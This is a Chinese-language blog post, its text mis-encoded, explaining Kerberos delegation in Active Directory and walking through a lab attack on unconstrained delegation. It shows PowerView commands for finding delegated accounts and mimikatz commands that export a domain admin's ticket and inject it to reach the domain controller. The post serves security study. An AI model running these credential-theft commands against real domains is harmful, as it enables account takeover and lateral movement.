<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.1"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>ç”¨åŸŸå§”æ´¾æ‰“çƒ‚kerberosç‹—å¤´ - æä¸‰çš„å‰‘è°±</title><meta description="ç”¨åŸŸå§”æ´¾æ‰“çƒ‚kerberosç‹—å¤´"><meta property="og:type" content="blog"><meta property="og:title" content="ç”¨åŸŸå§”æ´¾æ‰“çƒ‚kerberosç‹—å¤´"><meta property="og:url" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/"><meta property="og:site_name" content="æä¸‰çš„å‰‘è°±"><meta property="og:description" content="ç”¨åŸŸå§”æ´¾æ‰“çƒ‚kerberosç‹—å¤´"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1569681143411.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570712520459.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570712530920.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1569689280607.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709429377.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709452890.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709549303.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709591012.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709682895.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570777540500.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570850050489.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570850068279.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570868278901.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570868800619.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570871508561.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570713945685.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570701745743.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702323339.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702415606.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702431480.png"><meta property="og:image" content="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702480513.png"><meta property="article:published_time" content="2019-10-17T16:00:00.000Z"><meta property="article:modified_time" content="2020-07-11T07:59:37.169Z"><meta property="article:author" content="æä¸‰ï¼ˆcl0undï¼‰"><meta property="article:tag" content="kerberos"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="./1569681143411.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/"},"headline":"æä¸‰çš„å‰‘è°±","image":["https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1569681143411.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570712520459.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570712530920.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1569689280607.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709429377.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709452890.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709549303.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709591012.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570709682895.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570777540500.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570850050489.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570850068279.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570868278901.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570868800619.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570871508561.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570713945685.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570701745743.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702323339.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702415606.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702431480.png","https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/1570702480513.png"],"datePublished":"2019-10-17T16:00:00.000Z","dateModified":"2020-07-11T07:59:37.169Z","author":{"@type":"Person","name":"æä¸‰ï¼ˆcl0undï¼‰"},"description":"ç”¨åŸŸå§”æ´¾æ‰“çƒ‚kerberosç‹—å¤´"}</script><link rel="canonical" href="https://cl0und.github.io/2019/10/18/%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%89%93%E7%83%82kerberos%E7%8B%97%E5%A4%B4/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="alternate" href="/atom.xml" title="æä¸‰çš„å‰‘è°±" type="application/atom+xml">
</head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.png" alt="æä¸‰çš„å‰‘è°±" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" dateTime="2019-10-17T16:00:00.000Z" title="2019-10-17T16:00:00.000Z">2019-10-18</time><span class="level-item"><a class="link-muted" href="/categories/ad-security/">ad security</a></span><span class="level-item">16 minutes read (About 2435 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">ç”¨åŸŸå§”æ´¾æ‰“çƒ‚kerberosç‹—å¤´</h1><div class="content"><!-- å¦‚é¢˜ -->
<!-- more -->

<h2 id="ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹"><a href="#ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹" class="headerlink" title="ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹"></a>ç®€å•å›é¡¾Kerberosè®¤è¯è¿‡ç¨‹</h2><p>å‡è®¾clientæƒ³è®¿é—®server</p>
<ol>
<li>client å‘KDC-AS å‘èµ·é¢„è®¤è¯å³NTLMhashåŠ å¯†çš„æ—¶é—´æˆ³</li>
<li>KDC-AS éªŒè¯èº«ä»½åï¼Œå‘é€client NTLMhashåŠ å¯†çš„çŸ­ä¼šè¯å¯†é’¥seesionkey-aå’Œkrbtgtè´¦æˆ·å¯†ç åŠ å¯†çš„TGT(TGTä¸­ä¹ŸåŒ…å«äº†sessionkey-a)</li>
<li>client ç”¨è‡ªå·±çš„NTLMhashè§£å¯†æ‹¿åˆ°sessionkey-aï¼Œç”¨sessionkey-aåŠ å¯†æ—¶é—´æˆ³å¹¶å‘é€åŠ å¯†çš„TGTç»™KDC-TGS</li>
<li>KDC-TGSç”¨krbtgtè´¦æˆ·å¯†ç è§£å¯†è·å–åˆ°sessionkey-aï¼Œå¹¶è§£å¯†clientå‘é€çš„æ—¶é—´æˆ³ä»¥æ­¤éªŒæ˜clientèº«ä»½ã€‚ä¹‹åè¿”å›sessionkey-aåŠ å¯†çš„sessionkey-bå’Œserverçš„å¯†ç åŠ å¯†TGSï¼ˆæœ‰çš„æ–‡ç« ä¹Ÿç§°STï¼‰</li>
<li>clientç”¨sessionkey-a è§£å¯†æ‹¿åˆ°sessionkey-bï¼Œå¹¶ç”¨sessionkey-båŠ å¯†æ—¶é—´æˆ³ä¸€å¹¶å’ŒTGSå‘é€ç»™server</li>
<li>serverç”¨è‡ªå·±çš„å¯†ç è§£å¯†TGSæ‹¿åˆ°sessionkey-bè§£å¯†æ—¶é—´æˆ³ä»¥æ­¤éªŒæ˜clientèº«ä»½ã€‚è¿”å›sessionkey-båŠ å¯†çš„æ—¶é—´æˆ³ç»™clientï¼Œä»¥æ­¤å‘clientè¡¨æ˜è‡ªå·±çš„èº«ä»½ï¼ˆè¿™é‡Œä½“ç°å‡ºKerberosçš„åŒå‘éªŒè¯ï¼‰ã€‚</li>
</ol>
<h2 id="å§”æ´¾çš„åœºæ™¯"><a href="#å§”æ´¾çš„åœºæ™¯" class="headerlink" title="å§”æ´¾çš„åœºæ™¯"></a>å§”æ´¾çš„åœºæ™¯</h2><p>n1ntyå¸ˆå‚…çš„åŸè¯ï¼šç”¨æˆ· A åˆ©ç”¨ Windows èº«ä»½éªŒè¯è®¿é—®äº†ä¸€ä¸ªç½‘ç«™ï¼Œè¯·æ±‚ç½‘ç«™å†…çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªç½‘ç«™æœåŠ¡å™¨æœ¬èº«å¹¶æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶ï¼Œå®ƒéœ€è¦åˆ©ç”¨ç”¨æˆ· A çš„èº«ä»½å»è®¿é—®å¦ä¸€å°æœåŠ¡å™¨ï¼Œä»å¦ä¸€å°æœåŠ¡å™¨ä¸Šè·å–è¿™ä¸ªæ–‡ä»¶åå†è¿”å›ç»™ç”¨æˆ·ã€‚ä¸ºä»€ä¹ˆç½‘ç«™ä¼šåˆ©ç”¨ç”¨æˆ· A çš„èº«ä»½å»è·å–æ–‡ä»¶ï¼Œè€Œä¸æ˜¯ç›´æ¥åˆ©ç”¨ç½‘ç«™è‡ªèº«çš„æƒé™å»è·å–å‘¢ï¼Ÿå› ä¸ºè¦å……åˆ†åˆ©ç”¨ Windows ç³»ç»Ÿè‡ªèº«æä¾›çš„æƒé™æ§åˆ¶å•Šï¼Œä¹Ÿè®¸æœ‰çš„ç”¨æˆ·æœ‰æƒé™è®¿é—®é‚£ä¸ªæ–‡ä»¶è€Œæœ‰çš„ç”¨æˆ·æ²¡æœ‰æƒé™å•Šã€‚</p>
<h2 id="kerberoså§”æ´¾åˆ†ç±»"><a href="#kerberoså§”æ´¾åˆ†ç±»" class="headerlink" title="kerberoså§”æ´¾åˆ†ç±»"></a>kerberoså§”æ´¾åˆ†ç±»</h2><ul>
<li>Forwardable TGTï¼šUnconstrained delegation</li>
<li>Proxy ticketï¼šuser åœ¨è®¿é—® service1 çš„æ—¶å€™ï¼Œæå‰æŠŠè®¿é—®  service2 çš„ç¥¨ä¹Ÿç”³è¯·å¥½ï¼Œå¹¶æŠŠè¿™å¼ ç¥¨ä¼ é€’ç»™ service1ï¼Œç„¶å  service1 å°±å¯ä»¥åˆ©ç”¨ user çš„èº«ä»½æ¥è®¿é—®  service2</li>
<li>Constrained delegationï¼šä¼ ç»Ÿçš„çº¦æŸå§”æ´¾</li>
<li>Resource based delegationï¼šåŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</li>
</ul>
<h2 id="éçº¦æŸå§”æ´¾ï¼ˆUnconstrained-delegationï¼‰"><a href="#éçº¦æŸå§”æ´¾ï¼ˆUnconstrained-delegationï¼‰" class="headerlink" title="éçº¦æŸå§”æ´¾ï¼ˆUnconstrained delegationï¼‰"></a>éçº¦æŸå§”æ´¾ï¼ˆUnconstrained delegationï¼‰</h2><p>å‡å¦‚server1ä¸»æœºè´¦æˆ·é…ç½®äº†éçº¦æŸå§”æ´¾ï¼Œé‚£ä¹ˆåŸŸè´¦æˆ·Aåœ¨å¯¹server1ä¸»æœºè´¦æˆ·æ——ä¸‹æœåŠ¡service1ï¼ˆä¾‹å¦‚cifsæœåŠ¡ï¼‰äº§ç”Ÿkerberosè®¤è¯çš„æ—¶å€™ï¼ˆä¾‹å¦‚<code>dir \\server1\c$</code>ï¼‰åŸŸè´¦æˆ·ä¼šå‘é€åŒ…å«tgtçš„tgsç»™service1ï¼Œç„¶åservice1å°±å¯ä»¥ä»£è¡¨åŸŸè´¦æˆ·Aè®¤è¯åŸŸå†…ä»»ä½•æœåŠ¡å™¨ã€‚ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1569681143411.png" alt="Alt text"></p>
<p>å…¶æ”»å‡»é¢æ˜¯å¦‚æœé»‘å®¢æ§åˆ¶äº†server1å¹¶åœ¨ä¸Šé¢æŠ“å–äº†tgtå°±å¯ä»¥å€Ÿæ­¤æ¨ªå‘ç§»åŠ¨ã€‚</p>
<h2 id="çº¦æŸå§”æ´¾"><a href="#çº¦æŸå§”æ´¾" class="headerlink" title="çº¦æŸå§”æ´¾"></a>çº¦æŸå§”æ´¾</h2><p>çº¦æŸå§”æ´¾é‡Œé¢æœ‰ä¸¤ç§é‡è¦çš„åè®®ä¸€ç§å«S4U2Proxyï¼Œä¸€ç§å«S4U2Selfã€‚å‡å¦‚åœ¨ç»™server1ä¸»æœºè´¦æˆ·é…ç½®äº†å§”æ´¾åˆ°çš„server2 service2æœåŠ¡ã€‚é‚£ä¹ˆå½“åŸŸç”¨æˆ·Aä¸server1æ——ä¸‹çš„service1å‘ç”Ÿkerberosè®¤è¯çš„æ—¶å€™ï¼Œservice1å¯ä»¥æ‹¿åŸŸç”¨æˆ·Aç»™çš„tgs1ä»åŸŸæ§æ¢åˆ°å¯ä»¥è®¿é—®server2 service2çš„tgs2ã€‚åœ¨ç”¨tgs1æ¢tgs2çš„è¿‡ç¨‹ä¸­ä½¿ç”¨çš„åè®®å°±æ˜¯S4U2Proxyã€‚å¯æ˜¯æœ‰å¯èƒ½ç”¨æˆ·Aä»¥å…¶ä»–æ–¹å¼(å¦‚NTLMè®¤è¯ï¼ŒåŸºäºè¡¨å•çš„è®¤è¯ç­‰æ–¹å¼)ä¸server service1 è®¤è¯åç”¨æˆ·æ²¡æ³•æä¾›tgsï¼Œé‚£ä¹ˆservice1å°±å…ˆéœ€è¦ä½¿ç”¨S4U2Selfä»åŸŸæ§é‚£é‡Œå…ˆæ¢åˆ°ç”¨æˆ·å¯¹è‡ªå·±æœåŠ¡çš„tgs1ï¼Œå†ä½¿ç”¨S4U2Proxyæ¢å¯ä»¥è®¿é—®server2 service2çš„tgs2ã€‚</p>
<p>S4U2Proxyçš„ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1570712520459.png" alt="Alt text"></p>
<p>S4U2Selfçš„ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1570712530920.png" alt="Alt text"></p>
<p>å…¶æ”»å‡»é¢æ˜¯å¦‚æœé»‘å®¢æ§åˆ¶äº†server1é‚£ä¹ˆä»–å¯ä»¥ä¼ªé€ åŸŸå†…ä»»æ„ç”¨æˆ·è®¿é—®server2çš„service2</p>
<h3 id="ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾"><a href="#ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾" class="headerlink" title="ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾"></a>ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾</h3><p>ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾æ˜¯â€œæ­£å‘çš„â€ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡Aå±æ€§<code>msDS-AllowedToDelegateTo</code>ï¼Œæ·»åŠ æœåŠ¡Bçš„SPNï¼ˆService Principle Nameï¼‰ï¼Œè®¾ç½®çº¦æŸå§”æ´¾å¯¹è±¡ï¼ˆæœåŠ¡Bï¼‰ï¼ŒæœåŠ¡Aä¾¿å¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å‘åŸŸæ§åˆ¶å™¨è¯·æ±‚è®¿é—®æœåŠ¡Bä»¥è·å¾—æœåŠ¡ç¥¨æ®ï¼ˆTGSï¼‰æ¥ä½¿ç”¨æœåŠ¡Bçš„èµ„æºã€‚</p>
<h3 id="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"><a href="#åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾" class="headerlink" title="åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾"></a>åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾</h3><p>2012 åŠä»¥åçš„KDCï¼Œå—é™å§”æ´¾çš„æœºåˆ¶å˜æˆäº†åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åˆ™æ˜¯ç›¸åçš„ï¼Œé€šè¿‡ä¿®æ”¹æœåŠ¡Bå±æ€§<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>ï¼Œæ·»åŠ æœåŠ¡Açš„SPNï¼Œè¾¾åˆ°è®©æœåŠ¡Aæ¨¡æ‹Ÿç”¨æˆ·è®¿é—®Bèµ„æºçš„ç›®çš„ã€‚</p>
<p>ä¸¤è€…è”ç³»ä¸åŒºåˆ«ç¤ºæ„å›¾å¦‚ä¸‹<br><img src="./1569689280607.png" alt="Alt text"> </p>
<h2 id="å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·"><a href="#å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·" class="headerlink" title="å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·"></a>å‘ç°åŸŸå†…é…ç½®å§”æ´¾çš„è´¦æˆ·</h2><p>åœ¨åŸŸå†…çš„å¯ä»¥å§”æ´¾çš„è´¦æˆ·æœ‰ä¸¤ç§ä¸€ç§æ˜¯ä¸»æœºè´¦æˆ·ï¼ˆNetComputerï¼‰å¦ä¸€ç§æ˜¯ç”¨setspnæ‰‹åŠ¨æ·»åŠ çš„æœåŠ¡è´¦æˆ·ï¼ˆNetUserï¼‰ï¼Œä¸Šæ–‡ä¸­ä¸ç®¡æ˜¯éçº¦æŸè¿˜æ˜¯çº¦æŸçš„ä¾‹å­æ˜¯ä»¥ä¸»æœºè´¦æˆ·ä¸¾ä¾‹ï¼Œå› ä¸ºç”¨ä¸»æœºè´¦æˆ·æ¥å§”æ´¾çš„ç¯å¢ƒå¥½æ­å¹¶ä¸”ä¾¿äºç†è§£ï¼Œä¸è¿‡æœåŠ¡è´¦æˆ·å’Œä¸»æœºè´¦æˆ·ä»æ”»å‡»å§”æ´¾è¿™ä¸ªè§†è§’æ¥çœ‹æ˜¯ç­‰ä»·çš„ã€‚</p>
<p>æ£€æŸ¥éçº¦æŸå§”æ´¾å¯ä»¥ä½¿ç”¨masterç‰ˆçš„PowerView<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain beta.com</span><br><span class="line">Get-NetComputer -Unconstrained -Domain beta.com</span><br></pre></td></tr></table></figure>

<p>æ£€æŸ¥çº¦æŸå§”æ´¾å¯ä»¥ä½¿ç”¨å¼€å‘ç‰ˆçš„PowerView<br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -TrustedToAuth -Domain beta.com</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Domain beta.com</span><br></pre></td></tr></table></figure>

<h2 id="ç¯å¢ƒè¯´æ˜"><a href="#ç¯å¢ƒè¯´æ˜" class="headerlink" title="ç¯å¢ƒè¯´æ˜"></a>ç¯å¢ƒè¯´æ˜</h2><p>WIN-PMID8H9A6H0 192.168.3.2ï¼ˆåŸŸæ§ï¼Œ server2012ï¼‰<br>exchange 192.168.3.3 (server2012)<br>database 192.168.3.4 (win10)<br>database2 192.168.3.5 (win7)</p>
<h2 id="æ”»å‡»éçº¦æŸå§”æ´¾"><a href="#æ”»å‡»éçº¦æŸå§”æ´¾" class="headerlink" title="æ”»å‡»éçº¦æŸå§”æ´¾"></a>æ”»å‡»éçº¦æŸå§”æ´¾</h2><p>åœ¨WIN-PMID8H9A6H0ä¸Šç”¨åŸŸç®¡ç™»é™†ï¼ˆè¿™æ˜¯ä¸€å¥åºŸè¯ï¼Œé»˜è®¤æƒ…å†µåªæœ‰åŸŸç®¡å¯ä»¥ç™»é™†åŸŸæ§ï¼‰ï¼Œåœ¨Active Directoryç”¨æˆ·å’Œè®¡ç®—æœºä¸­ï¼Œå°†computerç»„é‡Œé¢çš„database2é€‰ä¸º<em>ä¿¡ä»»æ­¤è®¡ç®—æœºæ¥å§”æ´¾ä»»ä½•æœåŠ¡</em>å³éçº¦æŸå§”æ´¾ã€‚ç„¶ååœ¨cmdä¸­<code>dir \\database2\c$</code>ã€‚<br><img src="./1570709429377.png" alt="Alt text"></p>
<p>åœ¨database2ä¸Šç”¨æœ¬åœ°ç®¡ç†å‘˜ç™»é™†å¹¶ç”¨mimikatzæŠ“å–tickets</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets &#x2F;export&quot; exit</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°åŸŸç®¡ç†å‘˜ä¼ æ¥çš„tgt<br><img src="./1570709452890.png" alt="Alt text"></p>
<p>ç”¨mimikatzå°†åŸŸç®¡ç†å‘˜çš„tgtå¯¼å…¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;a4e7f]-2-0-60a10000-Administrator@krbtgt-BETA.COM.kirbi&quot; exit</span><br></pre></td></tr></table></figure>
<p><img src="./1570709549303.png" alt="Alt text"><br><img src="./1570709591012.png" alt="Alt text"></p>
<p>æœ¬åœ°ç®¡ç†å‘˜æˆåŠŸè®¿é—®åŸŸæ§<br><img src="./1570709682895.png" alt="Alt text"></p>
